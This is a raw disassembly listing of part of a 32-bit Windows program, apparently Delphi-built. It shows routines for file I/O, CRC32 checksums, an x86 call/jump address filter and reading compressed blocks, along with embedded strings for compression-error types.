  407578:	55                   	push   %ebp
  407579:	8b ec                	mov    %esp,%ebp
  40757b:	53                   	push   %ebx
  40757c:	56                   	push   %esi
  40757d:	8b d9                	mov    %ecx,%ebx
  40757f:	8b f2                	mov    %edx,%esi
  407581:	6a 00                	push   $0x0
  407583:	68 80 00 00 00       	push   $0x80
  407588:	33 c0                	xor    %eax,%eax
  40758a:	8a c3                	mov    %bl,%al
  40758c:	8b 04 85 74 b1 40 00 	mov    0x40b174(,%eax,4),%eax
  407593:	50                   	push   %eax
  407594:	6a 00                	push   $0x0
  407596:	33 c0                	xor    %eax,%eax
  407598:	8a 45 08             	mov    0x8(%ebp),%al
  40759b:	8b 04 85 64 b1 40 00 	mov    0x40b164(,%eax,4),%eax
  4075a2:	50                   	push   %eax
  4075a3:	33 c0                	xor    %eax,%eax
  4075a5:	8a 45 0c             	mov    0xc(%ebp),%al
  4075a8:	8b 04 85 58 b1 40 00 	mov    0x40b158(,%eax,4),%eax
  4075af:	50                   	push   %eax
  4075b0:	8b c6                	mov    %esi,%eax
  4075b2:	e8 5d be ff ff       	call   0x403414
  4075b7:	50                   	push   %eax
  4075b8:	e8 17 ce ff ff       	call   0x4043d4
  4075bd:	5e                   	pop    %esi
  4075be:	5b                   	pop    %ebx
  4075bf:	5d                   	pop    %ebp
  4075c0:	c2 08 00             	ret    $0x8
  4075c3:	90                   	nop
  4075c4:	53                   	push   %ebx
  4075c5:	56                   	push   %esi
  4075c6:	8b da                	mov    %edx,%ebx
  4075c8:	8b f0                	mov    %eax,%esi
  4075ca:	33 c0                	xor    %eax,%eax
  4075cc:	89 43 04             	mov    %eax,0x4(%ebx)
  4075cf:	6a 01                	push   $0x1
  4075d1:	8d 43 04             	lea    0x4(%ebx),%eax
  4075d4:	50                   	push   %eax
  4075d5:	6a 00                	push   $0x0
  4075d7:	8b 46 04             	mov    0x4(%esi),%eax
  4075da:	50                   	push   %eax
  4075db:	e8 f4 ce ff ff       	call   0x4044d4
  4075e0:	89 03                	mov    %eax,(%ebx)
  4075e2:	83 3b ff             	cmpl   $0xffffffff,(%ebx)
  4075e5:	75 10                	jne    0x4075f7
  4075e7:	e8 58 ce ff ff       	call   0x404444
  4075ec:	85 c0                	test   %eax,%eax
  4075ee:	74 07                	je     0x4075f7
  4075f0:	8b 06                	mov    (%esi),%eax
  4075f2:	e8 95 fe ff ff       	call   0x40748c
  4075f7:	5e                   	pop    %esi
  4075f8:	5b                   	pop    %ebx
  4075f9:	c3                   	ret
  4075fa:	8b c0                	mov    %eax,%eax
  4075fc:	53                   	push   %ebx
  4075fd:	56                   	push   %esi
  4075fe:	8b da                	mov    %edx,%ebx
  407600:	8b f0                	mov    %eax,%esi
  407602:	8d 43 04             	lea    0x4(%ebx),%eax
  407605:	50                   	push   %eax
  407606:	8b 46 04             	mov    0x4(%esi),%eax
  407609:	50                   	push   %eax
  40760a:	e8 25 ce ff ff       	call   0x404434
  40760f:	89 03                	mov    %eax,(%ebx)
  407611:	83 3b ff             	cmpl   $0xffffffff,(%ebx)
  407614:	75 10                	jne    0x407626
  407616:	e8 29 ce ff ff       	call   0x404444
  40761b:	85 c0                	test   %eax,%eax
  40761d:	74 07                	je     0x407626
  40761f:	8b 06                	mov    (%esi),%eax
  407621:	e8 66 fe ff ff       	call   0x40748c
  407626:	5e                   	pop    %esi
  407627:	5b                   	pop    %ebx
  407628:	c3                   	ret
  407629:	8d 40 00             	lea    0x0(%eax),%eax
  40762c:	53                   	push   %ebx
  40762d:	56                   	push   %esi
  40762e:	57                   	push   %edi
  40762f:	51                   	push   %ecx
  407630:	8b f9                	mov    %ecx,%edi
  407632:	8b f2                	mov    %edx,%esi
  407634:	8b d8                	mov    %eax,%ebx
  407636:	6a 00                	push   $0x0
  407638:	8d 44 24 04          	lea    0x4(%esp),%eax
  40763c:	50                   	push   %eax
  40763d:	57                   	push   %edi
  40763e:	56                   	push   %esi
  40763f:	8b 43 04             	mov    0x4(%ebx),%eax
  407642:	50                   	push   %eax
  407643:	e8 6c ce ff ff       	call   0x4044b4
  407648:	85 c0                	test   %eax,%eax
  40764a:	75 17                	jne    0x407663
  40764c:	80 7b 08 00          	cmpb   $0x0,0x8(%ebx)
  407650:	75 0a                	jne    0x40765c
  407652:	e8 ed cd ff ff       	call   0x404444
  407657:	83 f8 6d             	cmp    $0x6d,%eax
  40765a:	74 07                	je     0x407663
  40765c:	8b 03                	mov    (%ebx),%eax
  40765e:	e8 29 fe ff ff       	call   0x40748c
  407663:	8b 04 24             	mov    (%esp),%eax
  407666:	5a                   	pop    %edx
  407667:	5f                   	pop    %edi
  407668:	5e                   	pop    %esi
  407669:	5b                   	pop    %ebx
  40766a:	c3                   	ret
  40766b:	90                   	nop
  40766c:	53                   	push   %ebx
  40766d:	56                   	push   %esi
  40766e:	57                   	push   %edi
  40766f:	83 c4 f8             	add    $0xfffffff8,%esp
  407672:	8b f2                	mov    %edx,%esi
  407674:	8d 3c 24             	lea    (%esp),%edi
  407677:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407678:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407679:	8b d8                	mov    %eax,%ebx
  40767b:	6a 00                	push   $0x0
  40767d:	8d 44 24 08          	lea    0x8(%esp),%eax
  407681:	50                   	push   %eax
  407682:	8b 44 24 08          	mov    0x8(%esp),%eax
  407686:	50                   	push   %eax
  407687:	8b 43 04             	mov    0x4(%ebx),%eax
  40768a:	50                   	push   %eax
  40768b:	e8 44 ce ff ff       	call   0x4044d4
  407690:	40                   	inc    %eax
  407691:	75 10                	jne    0x4076a3
  407693:	e8 ac cd ff ff       	call   0x404444
  407698:	85 c0                	test   %eax,%eax
  40769a:	74 07                	je     0x4076a3
  40769c:	8b 03                	mov    (%ebx),%eax
  40769e:	e8 e9 fd ff ff       	call   0x40748c
  4076a3:	59                   	pop    %ecx
  4076a4:	5a                   	pop    %edx
  4076a5:	5f                   	pop    %edi
  4076a6:	5e                   	pop    %esi
  4076a7:	5b                   	pop    %ebx
  4076a8:	c3                   	ret
  4076a9:	8d 40 00             	lea    0x0(%eax),%eax
  4076ac:	53                   	push   %ebx
  4076ad:	8b d8                	mov    %eax,%ebx
  4076af:	8b 43 04             	mov    0x4(%ebx),%eax
  4076b2:	50                   	push   %eax
  4076b3:	e8 0c ce ff ff       	call   0x4044c4
  4076b8:	85 c0                	test   %eax,%eax
  4076ba:	75 07                	jne    0x4076c3
  4076bc:	8b 03                	mov    (%ebx),%eax
  4076be:	e8 c9 fd ff ff       	call   0x40748c
  4076c3:	5b                   	pop    %ebx
  4076c4:	c3                   	ret
  4076c5:	8d 40 00             	lea    0x0(%eax),%eax
  4076c8:	53                   	push   %ebx
  4076c9:	56                   	push   %esi
  4076ca:	57                   	push   %edi
  4076cb:	51                   	push   %ecx
  4076cc:	8b f1                	mov    %ecx,%esi
  4076ce:	8b fa                	mov    %edx,%edi
  4076d0:	8b d8                	mov    %eax,%ebx
  4076d2:	6a 00                	push   $0x0
  4076d4:	8d 44 24 04          	lea    0x4(%esp),%eax
  4076d8:	50                   	push   %eax
  4076d9:	56                   	push   %esi
  4076da:	57                   	push   %edi
  4076db:	8b 43 04             	mov    0x4(%ebx),%eax
  4076de:	50                   	push   %eax
  4076df:	e8 30 ce ff ff       	call   0x404514
  4076e4:	85 c0                	test   %eax,%eax
  4076e6:	75 07                	jne    0x4076ef
  4076e8:	8b 03                	mov    (%ebx),%eax
  4076ea:	e8 9d fd ff ff       	call   0x40748c
  4076ef:	3b 34 24             	cmp    (%esp),%esi
  4076f2:	74 0c                	je     0x407700
  4076f4:	ba 1d 00 00 00       	mov    $0x1d,%edx
  4076f9:	8b 03                	mov    (%ebx),%eax
  4076fb:	e8 ec fc ff ff       	call   0x4073ec
  407700:	5a                   	pop    %edx
  407701:	5f                   	pop    %edi
  407702:	5e                   	pop    %esi
  407703:	5b                   	pop    %ebx
  407704:	c3                   	ret
  407705:	8d 40 00             	lea    0x0(%eax),%eax
	...
  407720:	3c 77                	cmp    $0x77,%al
  407722:	40                   	inc    %eax
  407723:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407726:	00 00                	add    %al,(%eax)
  407728:	50                   	push   %eax
  407729:	46                   	inc    %esi
  40772a:	40                   	inc    %eax
  40772b:	00 c4                	add    %al,%ah
  40772d:	29 40 00             	sub    %eax,0x0(%eax)
  407730:	ac                   	lods   %ds:(%esi),%al
  407731:	28 40 00             	sub    %al,0x0(%eax)
  407734:	d4 28                	aam    $0x28
  407736:	40                   	inc    %eax
  407737:	00 18                	add    %bl,(%eax)
  407739:	29 40 00             	sub    %eax,0x0(%eax)
  40773c:	0e                   	push   %cs
  40773d:	45                   	inc    %ebp
  40773e:	43                   	inc    %ebx
  40773f:	6f                   	outsl  %ds:(%esi),(%dx)
  407740:	6d                   	insl   (%dx),%es:(%edi)
  407741:	70 72                	jo     0x4077b5
  407743:	65 73 73             	gs jae 0x4077b9
  407746:	45                   	inc    %ebp
  407747:	72 72                	jb     0x4077bb
  407749:	6f                   	outsl  %ds:(%esi),(%dx)
  40774a:	72 90                	jb     0x4076dc
	...
  407764:	80 77 40 00          	xorb   $0x0,0x40(%edi)
  407768:	0c 00                	or     $0x0,%al
  40776a:	00 00                	add    %al,(%eax)
  40776c:	3c 77                	cmp    $0x77,%al
  40776e:	40                   	inc    %eax
  40776f:	00 c4                	add    %al,%ah
  407771:	29 40 00             	sub    %eax,0x0(%eax)
  407774:	ac                   	lods   %ds:(%esi),%al
  407775:	28 40 00             	sub    %al,0x0(%eax)
  407778:	d4 28                	aam    $0x28
  40777a:	40                   	inc    %eax
  40777b:	00 18                	add    %bl,(%eax)
  40777d:	29 40 00             	sub    %eax,0x0(%eax)
  407780:	12 45 43             	adc    0x43(%ebp),%al
  407783:	6f                   	outsl  %ds:(%esi),(%dx)
  407784:	6d                   	insl   (%dx),%es:(%edi)
  407785:	70 72                	jo     0x4077f9
  407787:	65 73 73             	gs jae 0x4077fd
  40778a:	44                   	inc    %esp
  40778b:	61                   	popa
  40778c:	74 61                	je     0x4077ef
  40778e:	45                   	inc    %ebp
  40778f:	72 72                	jb     0x407803
  407791:	6f                   	outsl  %ds:(%esi),(%dx)
  407792:	72 90                	jb     0x407724
	...
  4077ac:	c8 77 40 00          	enter  $0x4077,$0x0
  4077b0:	0c 00                	or     $0x0,%al
  4077b2:	00 00                	add    %al,(%eax)
  4077b4:	3c 77                	cmp    $0x77,%al
  4077b6:	40                   	inc    %eax
  4077b7:	00 c4                	add    %al,%ah
  4077b9:	29 40 00             	sub    %eax,0x0(%eax)
  4077bc:	ac                   	lods   %ds:(%esi),%al
  4077bd:	28 40 00             	sub    %al,0x0(%eax)
  4077c0:	d4 28                	aam    $0x28
  4077c2:	40                   	inc    %eax
  4077c3:	00 18                	add    %bl,(%eax)
  4077c5:	29 40 00             	sub    %eax,0x0(%eax)
  4077c8:	16                   	push   %ss
  4077c9:	45                   	inc    %ebp
  4077ca:	43                   	inc    %ebx
  4077cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4077cc:	6d                   	insl   (%dx),%es:(%edi)
  4077cd:	70 72                	jo     0x407841
  4077cf:	65 73 73             	gs jae 0x407845
  4077d2:	49                   	dec    %ecx
  4077d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4077d4:	74 65                	je     0x40783b
  4077d6:	72 6e                	jb     0x407846
  4077d8:	61                   	popa
  4077d9:	6c                   	insb   (%dx),%es:(%edi)
  4077da:	45                   	inc    %ebp
  4077db:	72 72                	jb     0x40784f
  4077dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4077de:	72 90                	jb     0x407770
	...
  4077f8:	20 78 40             	and    %bh,0x40(%eax)
  4077fb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4077fe:	00 00                	add    %al,(%eax)
  407800:	3c 10                	cmp    $0x10,%al
  407802:	40                   	inc    %eax
  407803:	00 c4                	add    %al,%ah
  407805:	29 40 00             	sub    %eax,0x0(%eax)
  407808:	ac                   	lods   %ds:(%esi),%al
  407809:	28 40 00             	sub    %al,0x0(%eax)
  40780c:	d4 28                	aam    $0x28
  40780e:	40                   	inc    %eax
  40780f:	00 18                	add    %bl,(%eax)
  407811:	29 40 00             	sub    %eax,0x0(%eax)
  407814:	e8 79 40 00 34       	call   0x3440b892
  407819:	78 40                	js     0x40785b
  40781b:	00 3c 78             	add    %bh,(%eax,%edi,2)
  40781e:	40                   	inc    %eax
  40781f:	00 13                	add    %dl,(%ebx)
  407821:	54                   	push   %esp
  407822:	43                   	inc    %ebx
  407823:	75 73                	jne    0x407898
  407825:	74 6f                	je     0x407896
  407827:	6d                   	insl   (%dx),%es:(%edi)
  407828:	44                   	inc    %esp
  407829:	65 63 6f 6d          	arpl   %ebp,%gs:0x6d(%edi)
  40782d:	70 72                	jo     0x4078a1
  40782f:	65 73 73             	gs jae 0x4078a5
  407832:	6f                   	outsl  %ds:(%esi),(%dx)
  407833:	72 e9                	jb     0x40781e
  407835:	c7                   	(bad)
  407836:	ae                   	scas   %es:(%edi),%al
  407837:	ff                   	(bad)
  407838:	ff 8d 40 00 e9 bf    	decl   -0x4016ffc0(%ebp)
  40783e:	ae                   	scas   %es:(%edi),%al
  40783f:	ff                   	(bad)
  407840:	ff 8d 40 00 00 00    	decl   0x40(%ebp)
	...
  40785a:	00 00                	add    %al,(%eax)
  40785c:	78 78                	js     0x4078d6
  40785e:	40                   	inc    %eax
  40785f:	00 1c 10             	add    %bl,(%eax,%edx,1)
  407862:	00 00                	add    %al,(%eax)
  407864:	3c 10                	cmp    $0x10,%al
  407866:	40                   	inc    %eax
  407867:	00 c4                	add    %al,%ah
  407869:	29 40 00             	sub    %eax,0x0(%eax)
  40786c:	ac                   	lods   %ds:(%esi),%al
  40786d:	28 40 00             	sub    %al,0x0(%eax)
  407870:	d4 28                	aam    $0x28
  407872:	40                   	inc    %eax
  407873:	00 5c 7b 40          	add    %bl,0x40(%ebx,%edi,2)
  407877:	00 16                	add    %dl,(%esi)
  407879:	54                   	push   %esp
  40787a:	43                   	inc    %ebx
  40787b:	6f                   	outsl  %ds:(%esi),(%dx)
  40787c:	6d                   	insl   (%dx),%es:(%edi)
  40787d:	70 72                	jo     0x4078f1
  40787f:	65 73 73             	gs jae 0x4078f5
  407882:	65 64 42             	gs fs inc %edx
  407885:	6c                   	insb   (%dx),%es:(%edi)
  407886:	6f                   	outsl  %ds:(%esi),(%dx)
  407887:	63 6b 52             	arpl   %ebp,0x52(%ebx)
  40788a:	65 61                	gs popa
  40788c:	64 65 72 90          	fs gs jb 0x407820
  407890:	56                   	push   %esi
  407891:	33 f6                	xor    %esi,%esi
  407893:	b9 5c c5 40 00       	mov    $0x40c55c,%ecx
  407898:	8b c6                	mov    %esi,%eax
  40789a:	ba 08 00 00 00       	mov    $0x8,%edx
  40789f:	a8 01                	test   $0x1,%al
  4078a1:	74 09                	je     0x4078ac
  4078a3:	d1 e8                	shr    $1,%eax
  4078a5:	35 20 83 b8 ed       	xor    $0xedb88320,%eax
  4078aa:	eb 02                	jmp    0x4078ae
  4078ac:	d1 e8                	shr    $1,%eax
  4078ae:	4a                   	dec    %edx
  4078af:	75 ee                	jne    0x40789f
  4078b1:	89 01                	mov    %eax,(%ecx)
  4078b3:	46                   	inc    %esi
  4078b4:	83 c1 04             	add    $0x4,%ecx
  4078b7:	81 fe 00 01 00 00    	cmp    $0x100,%esi
  4078bd:	75 d9                	jne    0x407898
  4078bf:	5e                   	pop    %esi
  4078c0:	c3                   	ret
  4078c1:	8d 40 00             	lea    0x0(%eax),%eax
  4078c4:	53                   	push   %ebx
  4078c5:	56                   	push   %esi
  4078c6:	57                   	push   %edi
  4078c7:	8b f1                	mov    %ecx,%esi
  4078c9:	8b fa                	mov    %edx,%edi
  4078cb:	8b d8                	mov    %eax,%ebx
  4078cd:	83 3d 58 c5 40 00 00 	cmpl   $0x0,0x40c558
  4078d4:	75 11                	jne    0x4078e7
  4078d6:	e8 b5 ff ff ff       	call   0x407890
  4078db:	6a 01                	push   $0x1
  4078dd:	68 58 c5 40 00       	push   $0x40c558
  4078e2:	e8 15 cb ff ff       	call   0x4043fc
  4078e7:	8b c7                	mov    %edi,%eax
  4078e9:	85 f6                	test   %esi,%esi
  4078eb:	74 25                	je     0x407912
  4078ed:	8b d3                	mov    %ebx,%edx
  4078ef:	66 81 e2 ff 00       	and    $0xff,%dx
  4078f4:	33 c9                	xor    %ecx,%ecx
  4078f6:	8a 08                	mov    (%eax),%cl
  4078f8:	66 33 d1             	xor    %cx,%dx
  4078fb:	0f b7 d2             	movzwl %dx,%edx
  4078fe:	8b 14 95 5c c5 40 00 	mov    0x40c55c(,%edx,4),%edx
  407905:	c1 eb 08             	shr    $0x8,%ebx
  407908:	33 d3                	xor    %ebx,%edx
  40790a:	8b da                	mov    %edx,%ebx
  40790c:	4e                   	dec    %esi
  40790d:	40                   	inc    %eax
  40790e:	85 f6                	test   %esi,%esi
  407910:	75 db                	jne    0x4078ed
  407912:	8b c3                	mov    %ebx,%eax
  407914:	5f                   	pop    %edi
  407915:	5e                   	pop    %esi
  407916:	5b                   	pop    %ebx
  407917:	c3                   	ret
  407918:	53                   	push   %ebx
  407919:	56                   	push   %esi
  40791a:	8b f2                	mov    %edx,%esi
  40791c:	8b d8                	mov    %eax,%ebx
  40791e:	8b d3                	mov    %ebx,%edx
  407920:	8b ce                	mov    %esi,%ecx
  407922:	83 c8 ff             	or     $0xffffffff,%eax
  407925:	e8 9a ff ff ff       	call   0x4078c4
  40792a:	83 f0 ff             	xor    $0xffffffff,%eax
  40792d:	5e                   	pop    %esi
  40792e:	5b                   	pop    %ebx
  40792f:	c3                   	ret
  407930:	55                   	push   %ebp
  407931:	8b ec                	mov    %esp,%ebp
  407933:	83 c4 f8             	add    $0xfffffff8,%esp
  407936:	53                   	push   %ebx
  407937:	56                   	push   %esi
  407938:	57                   	push   %edi
  407939:	88 4d ff             	mov    %cl,-0x1(%ebp)
  40793c:	83 fa 05             	cmp    $0x5,%edx
  40793f:	0f 8c 9a 00 00 00    	jl     0x4079df
  407945:	83 ea 04             	sub    $0x4,%edx
  407948:	8b f0                	mov    %eax,%esi
  40794a:	33 c0                	xor    %eax,%eax
  40794c:	3b d0                	cmp    %eax,%edx
  40794e:	0f 8e 8b 00 00 00    	jle    0x4079df
  407954:	8a 0c 06             	mov    (%esi,%eax,1),%cl
  407957:	80 f9 e8             	cmp    $0xe8,%cl
  40795a:	74 05                	je     0x407961
  40795c:	80 f9 e9             	cmp    $0xe9,%cl
  40795f:	75 75                	jne    0x4079d6
  407961:	40                   	inc    %eax
  407962:	8a 4c 06 03          	mov    0x3(%esi,%eax,1),%cl
  407966:	84 c9                	test   %cl,%cl
  407968:	74 05                	je     0x40796f
  40796a:	80 f9 ff             	cmp    $0xff,%cl
  40796d:	75 62                	jne    0x4079d1
  40796f:	8b 5d 08             	mov    0x8(%ebp),%ebx
  407972:	03 d8                	add    %eax,%ebx
  407974:	83 c3 04             	add    $0x4,%ebx
  407977:	81 e3 ff ff ff 00    	and    $0xffffff,%ebx
  40797d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  407980:	0f b6 3c 06          	movzbl (%esi,%eax,1),%edi
  407984:	33 db                	xor    %ebx,%ebx
  407986:	8a 5c 06 01          	mov    0x1(%esi,%eax,1),%bl
  40798a:	c1 e3 08             	shl    $0x8,%ebx
  40798d:	0b fb                	or     %ebx,%edi
  40798f:	33 db                	xor    %ebx,%ebx
  407991:	8a 5c 06 02          	mov    0x2(%esi,%eax,1),%bl
  407995:	c1 e3 10             	shl    $0x10,%ebx
  407998:	0b fb                	or     %ebx,%edi
  40799a:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  40799e:	75 03                	jne    0x4079a3
  4079a0:	2b 7d f8             	sub    -0x8(%ebp),%edi
  4079a3:	f7 c7 00 00 80 00    	test   $0x800000,%edi
  4079a9:	74 06                	je     0x4079b1
  4079ab:	f6 d1                	not    %cl
  4079ad:	88 4c 06 03          	mov    %cl,0x3(%esi,%eax,1)
  4079b1:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  4079b5:	74 03                	je     0x4079ba
  4079b7:	03 7d f8             	add    -0x8(%ebp),%edi
  4079ba:	8b cf                	mov    %edi,%ecx
  4079bc:	88 0c 06             	mov    %cl,(%esi,%eax,1)
  4079bf:	8b cf                	mov    %edi,%ecx
  4079c1:	c1 e9 08             	shr    $0x8,%ecx
  4079c4:	88 4c 06 01          	mov    %cl,0x1(%esi,%eax,1)
  4079c8:	8b cf                	mov    %edi,%ecx
  4079ca:	c1 e9 10             	shr    $0x10,%ecx
  4079cd:	88 4c 06 02          	mov    %cl,0x2(%esi,%eax,1)
  4079d1:	83 c0 04             	add    $0x4,%eax
  4079d4:	eb 01                	jmp    0x4079d7
  4079d6:	40                   	inc    %eax
  4079d7:	3b d0                	cmp    %eax,%edx
  4079d9:	0f 8f 75 ff ff ff    	jg     0x407954
  4079df:	5f                   	pop    %edi
  4079e0:	5e                   	pop    %esi
  4079e1:	5b                   	pop    %ebx
  4079e2:	59                   	pop    %ecx
  4079e3:	59                   	pop    %ecx
  4079e4:	5d                   	pop    %ebp
  4079e5:	c2 04 00             	ret    $0x4
  4079e8:	55                   	push   %ebp
  4079e9:	8b ec                	mov    %esp,%ebp
  4079eb:	53                   	push   %ebx
  4079ec:	56                   	push   %esi
  4079ed:	84 d2                	test   %dl,%dl
  4079ef:	74 08                	je     0x4079f9
  4079f1:	83 c4 f0             	add    $0xfffffff0,%esp
  4079f4:	e8 cf b0 ff ff       	call   0x402ac8
  4079f9:	8b da                	mov    %edx,%ebx
  4079fb:	8b f0                	mov    %eax,%esi
  4079fd:	33 d2                	xor    %edx,%edx
  4079ff:	8b c6                	mov    %esi,%eax
  407a01:	e8 f6 ae ff ff       	call   0x4028fc
  407a06:	8b 45 08             	mov    0x8(%ebp),%eax
  407a09:	89 46 04             	mov    %eax,0x4(%esi)
  407a0c:	8b 45 0c             	mov    0xc(%ebp),%eax
  407a0f:	89 46 08             	mov    %eax,0x8(%esi)
  407a12:	84 db                	test   %bl,%bl
  407a14:	74 0a                	je     0x407a20
  407a16:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  407a1d:	83 c4 0c             	add    $0xc,%esp
  407a20:	8b c6                	mov    %esi,%eax
  407a22:	5e                   	pop    %esi
  407a23:	5b                   	pop    %ebx
  407a24:	5d                   	pop    %ebp
  407a25:	c2 08 00             	ret    $0x8
  407a28:	55                   	push   %ebp
  407a29:	8b ec                	mov    %esp,%ebp
  407a2b:	83 c4 e0             	add    $0xffffffe0,%esp
  407a2e:	53                   	push   %ebx
  407a2f:	56                   	push   %esi
  407a30:	57                   	push   %edi
  407a31:	84 d2                	test   %dl,%dl
  407a33:	74 08                	je     0x407a3d
  407a35:	83 c4 f0             	add    $0xfffffff0,%esp
  407a38:	e8 8b b0 ff ff       	call   0x402ac8
  407a3d:	8b f1                	mov    %ecx,%esi
  407a3f:	88 55 ff             	mov    %dl,-0x1(%ebp)
  407a42:	8b d8                	mov    %eax,%ebx
  407a44:	33 d2                	xor    %edx,%edx
  407a46:	8b c3                	mov    %ebx,%eax
  407a48:	e8 af ae ff ff       	call   0x4028fc
  407a4d:	89 73 08             	mov    %esi,0x8(%ebx)
  407a50:	8d 55 f8             	lea    -0x8(%ebp),%edx
  407a53:	b9 04 00 00 00       	mov    $0x4,%ecx
  407a58:	8b c6                	mov    %esi,%eax
  407a5a:	8b 38                	mov    (%eax),%edi
  407a5c:	ff 57 08             	call   *0x8(%edi)
  407a5f:	83 f8 04             	cmp    $0x4,%eax
  407a62:	75 14                	jne    0x407a78
  407a64:	8d 55 f0             	lea    -0x10(%ebp),%edx
  407a67:	b9 05 00 00 00       	mov    $0x5,%ecx
  407a6c:	8b c6                	mov    %esi,%eax
  407a6e:	8b 38                	mov    (%eax),%edi
  407a70:	ff 57 08             	call   *0x8(%edi)
  407a73:	83 f8 05             	cmp    $0x5,%eax
  407a76:	74 16                	je     0x407a8e
  407a78:	b9 3c 7b 40 00       	mov    $0x407b3c,%ecx
  407a7d:	b2 01                	mov    $0x1,%dl
  407a7f:	b8 80 77 40 00       	mov    $0x407780,%eax
  407a84:	e8 f7 dd ff ff       	call   0x405880
  407a89:	e8 26 b4 ff ff       	call   0x402eb4
  407a8e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407a91:	ba 05 00 00 00       	mov    $0x5,%edx
  407a96:	e8 7d fe ff ff       	call   0x407918
  407a9b:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  407a9e:	74 16                	je     0x407ab6
  407aa0:	b9 3c 7b 40 00       	mov    $0x407b3c,%ecx
  407aa5:	b2 01                	mov    $0x1,%dl
  407aa7:	b8 80 77 40 00       	mov    $0x407780,%eax
  407aac:	e8 cf dd ff ff       	call   0x405880
  407ab1:	e8 fe b3 ff ff       	call   0x402eb4
  407ab6:	8d 55 e8             	lea    -0x18(%ebp),%edx
  407ab9:	8b c6                	mov    %esi,%eax
  407abb:	8b 08                	mov    (%eax),%ecx
  407abd:	ff 11                	call   *(%ecx)
  407abf:	8d 45 e8             	lea    -0x18(%ebp),%eax
  407ac2:	8b 55 f0             	mov    -0x10(%ebp),%edx
  407ac5:	e8 62 eb ff ff       	call   0x40662c
  407aca:	8d 55 e0             	lea    -0x20(%ebp),%edx
  407acd:	8b c6                	mov    %esi,%eax
  407acf:	8b 08                	mov    (%eax),%ecx
  407ad1:	ff 51 04             	call   *0x4(%ecx)
  407ad4:	8d 55 e0             	lea    -0x20(%ebp),%edx
  407ad7:	8d 45 e8             	lea    -0x18(%ebp),%eax
  407ada:	e8 2d eb ff ff       	call   0x40660c
  407adf:	85 c0                	test   %eax,%eax
  407ae1:	7e 16                	jle    0x407af9
  407ae3:	b9 3c 7b 40 00       	mov    $0x407b3c,%ecx
  407ae8:	b2 01                	mov    $0x1,%dl
  407aea:	b8 80 77 40 00       	mov    $0x407780,%eax
  407aef:	e8 8c dd ff ff       	call   0x405880
  407af4:	e8 bb b3 ff ff       	call   0x402eb4
  407af9:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  407afd:	74 10                	je     0x407b0f
  407aff:	53                   	push   %ebx
  407b00:	68 5c 7c 40 00       	push   $0x407c5c
  407b05:	b2 01                	mov    $0x1,%dl
  407b07:	8b 45 08             	mov    0x8(%ebp),%eax
  407b0a:	ff 10                	call   *(%eax)
  407b0c:	89 43 04             	mov    %eax,0x4(%ebx)
  407b0f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407b12:	89 43 0c             	mov    %eax,0xc(%ebx)
  407b15:	c6 43 10 01          	movb   $0x1,0x10(%ebx)
  407b19:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  407b1d:	74 0a                	je     0x407b29
  407b1f:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  407b26:	83 c4 0c             	add    $0xc,%esp
  407b29:	8b c3                	mov    %ebx,%eax
  407b2b:	5f                   	pop    %edi
  407b2c:	5e                   	pop    %esi
  407b2d:	5b                   	pop    %ebx
  407b2e:	8b e5                	mov    %ebp,%esp
  407b30:	5d                   	pop    %ebp
  407b31:	c2 04 00             	ret    $0x4
  407b34:	ff                   	(bad)
  407b35:	ff                   	(bad)
  407b36:	ff                   	(bad)
  407b37:	ff 1d 00 00 00 43    	lcall  *0x43000000
  407b3d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b3e:	6d                   	insl   (%dx),%es:(%edi)
  407b3f:	70 72                	jo     0x407bb3
  407b41:	65 73 73             	gs jae 0x407bb7
  407b44:	65 64 20 62 6c       	gs and %ah,%fs:0x6c(%edx)
  407b49:	6f                   	outsl  %ds:(%esi),(%dx)
  407b4a:	63 6b 20             	arpl   %ebp,0x20(%ebx)
  407b4d:	69 73 20 63 6f 72 72 	imul   $0x72726f63,0x20(%ebx),%esi
  407b54:	75 70                	jne    0x407bc6
  407b56:	74 65                	je     0x407bbd
  407b58:	64 00 00             	add    %al,%fs:(%eax)
  407b5b:	00 53 56             	add    %dl,0x56(%ebx)
  407b5e:	83 c4 f8             	add    $0xfffffff8,%esp
  407b61:	8b da                	mov    %edx,%ebx
  407b63:	8b f0                	mov    %eax,%esi
  407b65:	8b 46 04             	mov    0x4(%esi),%eax
  407b68:	e8 b7 ad ff ff       	call   0x402924
  407b6d:	80 7e 10 00          	cmpb   $0x0,0x10(%esi)
  407b71:	74 1d                	je     0x407b90
  407b73:	8b d4                	mov    %esp,%edx
  407b75:	8b 46 08             	mov    0x8(%esi),%eax
  407b78:	8b 08                	mov    (%eax),%ecx
  407b7a:	ff 11                	call   *(%ecx)
  407b7c:	8b c4                	mov    %esp,%eax
  407b7e:	8b 56 0c             	mov    0xc(%esi),%edx
  407b81:	e8 a6 ea ff ff       	call   0x40662c
  407b86:	8b d4                	mov    %esp,%edx
  407b88:	8b 46 08             	mov    0x8(%esi),%eax
  407b8b:	8b 08                	mov    (%eax),%ecx
  407b8d:	ff 51 0c             	call   *0xc(%ecx)
  407b90:	33 d2                	xor    %edx,%edx
  407b92:	8b c6                	mov    %esi,%eax
  407b94:	e8 7f ad ff ff       	call   0x402918
  407b99:	84 db                	test   %bl,%bl
  407b9b:	74 07                	je     0x407ba4
  407b9d:	8b c6                	mov    %esi,%eax
  407b9f:	e8 60 af ff ff       	call   0x402b04
  407ba4:	8b c6                	mov    %esi,%eax
  407ba6:	59                   	pop    %ecx
  407ba7:	5a                   	pop    %edx
  407ba8:	5e                   	pop    %esi
  407ba9:	5b                   	pop    %ebx
  407baa:	c3                   	ret
  407bab:	90                   	nop
  407bac:	53                   	push   %ebx
  407bad:	56                   	push   %esi
